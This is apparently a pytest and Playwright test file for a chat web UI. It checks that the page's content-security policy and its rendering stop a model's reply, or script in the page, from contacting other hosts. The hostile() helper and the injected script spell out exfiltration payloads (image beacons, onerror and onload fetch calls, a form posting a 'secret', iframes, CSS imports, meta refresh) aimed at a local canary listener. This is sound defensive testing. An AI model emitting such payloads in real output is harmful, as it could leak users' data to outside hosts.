"""A model's reply cannot reach out of the page: no beacon, no navigation, no form."""
from __future__ import annotations

import http.server
import threading

import pytest
from test_fleet_chat_browser import chat_browser  # noqa: F401  (the daemon and page fixture)

pytestmark = pytest.mark.slow


class Canary:
    """A listener on another loopback port that records every request it is sent."""

    def __init__(self):
        seen = self.seen = []

        class Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                seen.append(self.path)
                self.send_response(200)
                self.send_header("Content-Type", "image/gif")
                self.end_headers()

            do_POST = do_GET

            def log_message(self, *args):
                pass

        self.server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.origin = f"http://127.0.0.1:{self.server.server_address[1]}"
        threading.Thread(target=self.server.serve_forever, daemon=True).start()

    def close(self):
        self.server.shutdown()
        self.server.server_close()


@pytest.fixture
def canary():
    listener = Canary()
    try:
        yield listener
    finally:
        listener.close()


def hostile(origin):
    return "\n\n".join((
        f"Here is the result. ![chart]({origin}/markdown-image) and [the report]({origin}/markdown-link)",
        f'<img src="{origin}/html-image" onerror="fetch(\'{origin}/onerror\')">',
        f'<a href="{origin}/html-link" target="_blank">open this</a>',
        f'<form action="{origin}/form" method="post"><input name="secret" value="x"><button>Send</button></form>',
        f'<iframe src="{origin}/frame"></iframe><link rel="stylesheet" href="{origin}/sheet">',
        f'<style>body {{ background: url({origin}/css) }} @import url({origin}/import);</style>',
        f'<svg onload="fetch(\'{origin}/svg\')"><image href="{origin}/svg-image"/></svg>',
        f'<meta http-equiv="refresh" content="0;url={origin}/refresh"><base href="{origin}/">',
        f'<video src="{origin}/video" poster="{origin}/poster"></video>',
        "The end.",
    ))


def test_page_is_served_with_a_policy_that_reads_only_itself(chat_browser):  # noqa: F811
    served, page = chat_browser
    response = page.goto(f"http://127.0.0.1:{served.port}/ui#chat")
    policy = response.headers["content-security-policy"]
    for directive in ("default-src 'none'", "connect-src 'self'", "form-action 'none'",
                      "base-uri 'none'", "frame-ancestors 'none'", "frame-src 'none'"):
        assert directive in policy
    assert "img-src 'self' data: blob:" in policy
    assert "*" not in policy and "http:" not in policy and "https:" not in policy


def test_a_hostile_reply_is_shown_as_words_and_reaches_nothing(chat_browser, canary):  # noqa: F811
    from playwright.sync_api import expect
    served, page = chat_browser
    saved = served.ui.conversations.start(model="model-a", title="Hostile reply")
    served.ui.conversations.append(saved.id, "user", "Summarise")
    served.ui.conversations.append(saved.id, "assistant", hostile(canary.origin))
    page.goto(f"http://127.0.0.1:{served.port}/ui#chat")
    page.locator("chat-view #chat-pickrow").wait_for(state="visible")
    page.get_by_role("link", name="Hostile reply", exact=True).click()
    messages = page.locator("chat-view #chat-messages")
    expect(messages).to_contain_text("The end.")
    expect(messages).to_contain_text(f"{canary.origin}/markdown-link")
    expect(messages).to_contain_text("[image: chart")
    page.wait_for_timeout(1500)
    for tag in ("a", "img", "form", "input", "button.send", "iframe", "svg", "video", "link", "style", "meta", "base"):
        selector = f"chat-view #chat-messages .message-body {tag}"
        assert page.locator(selector).count() == 0, tag
    assert page.url.startswith(f"http://127.0.0.1:{served.port}/ui")
    assert canary.seen == []


def test_policy_blocks_what_script_in_the_page_tries(chat_browser, canary):  # noqa: F811
    served, page = chat_browser
    page.goto(f"http://127.0.0.1:{served.port}/ui#chat")
    page.locator("chat-view #chat-pickrow").wait_for(state="visible")
    blocked = page.evaluate("""async (origin) => {
      const violations = [];
      document.addEventListener("securitypolicyviolation", event => violations.push(event.violatedDirective));
      new Image().src = origin + "/script-image";
      await fetch(origin + "/script-fetch", { mode: "no-cors" }).catch(() => {});
      const form = Object.assign(document.createElement("form"), { action: origin + "/script-form", method: "post" });
      document.body.append(form);
      form.submit();
      const frame = Object.assign(document.createElement("iframe"), { src: origin + "/script-frame" });
      document.body.append(frame);
      await new Promise(done => setTimeout(done, 1000));
      return violations;
    }""", canary.origin)
    assert {"img-src", "connect-src", "form-action", "frame-src"} <= {item.split()[0] for item in blocked}
    assert canary.seen == []
